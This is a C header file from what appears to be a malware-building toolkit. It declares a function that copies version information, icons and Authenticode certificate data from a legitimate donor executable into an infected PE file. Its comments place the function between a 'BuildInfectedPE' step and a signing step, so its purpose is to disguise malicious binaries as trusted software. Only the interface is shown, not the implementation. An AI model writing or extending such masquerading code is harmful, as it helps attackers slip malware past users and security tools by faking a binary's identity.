/*
 * CloneMeta.h - PE identity cloning (VERSIONINFO, icon, cert directory)
 *
 * Companion to CloneMeta.cpp. Public surface mirrors PeSigning.h style.
 */
#pragma once
#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Copy VERSIONINFO, icon group, and Authenticode cert directory from donorPath
 * into the already-built targetPath. Must be called after BuildInfectedPE and
 * before SignPeWithPfx (real signature overwrites the cloned cert directory).
 *
 * Returns 0 on success. Soft failures (donor unsigned, no VERSIONINFO/icon)
 * print a warning to stderr and return 0. Hard failures return:
 *   101  donor file unreadable
 *   102  donor is not a valid PE
 *   103  BeginUpdateResource failed on target
 *   104  EndUpdateResource failed on target
 *   105  cert append: target file I/O failed
 *   106  cert append: MapFileAndCheckSumA failed */
int CloneMeta_Apply(const char* targetPath, const char* donorPath);

#ifdef __cplusplus
}
#endif
